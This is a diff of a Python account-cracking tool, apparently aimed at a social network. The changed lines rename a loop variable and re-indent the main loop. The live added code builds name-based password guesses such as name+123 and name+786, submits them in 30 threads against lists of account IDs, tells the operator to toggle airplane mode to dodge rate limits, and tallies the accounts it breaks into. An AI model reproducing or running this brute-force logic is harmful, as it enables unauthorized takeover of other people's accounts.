@@ -403,7 +403,7 @@ class crack_main():
                 print("\n [?] Limit ids Example 1000,5000,50000")
                 limit = int(input(" Limit Ids : "))
                 lists = ['3','4']
-                for xd in range(limit):
+                for nmbr in range(limit):
                         lchoice = random.choice(lists)
                         if '3' in lchoice:
                                 mail = ''.join(random.choice(string.digits) for _ in range(3))
@@ -414,23 +414,23 @@ class crack_main():
                         zee = open('.re.txt', 'r').read().splitlines()
                 with ThreadPool(max_workers=30) as formSubmit:
                         total = str(len(zee))
-                os.system('clear')
-                print(logo)
-                print(' Total Ids : '+str(len(total)))
-                print(' Cloning Is Started Wait For Results')
-                print(' After Every 5 Min Turn Airplane On/Off')
-                print(50*'=')
-                for user in zee:
-                         iid,names = user.split('|')
-                         first_name = names.rsplit(' ')[0]
-                         try:
-                                 last_name = names.rsplit(' ')[1]
-                         except IndexError:
-                                 last_name = 'Khan'
-                         fs = first_name.lower()
-                         ls = last_name.lower()
-                         passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                         formSubmit.submit(self.m1,iid,name,passlist)
+                        os.system('clear')
+                        print(logo)
+                        print(' Total Ids : '+str(len(total)))
+                        print(' Cloning Is Started Wait For Results')
+                        print(' After Every 5 Min Turn Airplane On/Off')
+                        print(50*'=')
+                        for user in zee:
+                                iid,name = user.split('|')
+                                first_name = name.rsplit(' ')[0]
+                                try:
+                                        last_name = name.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
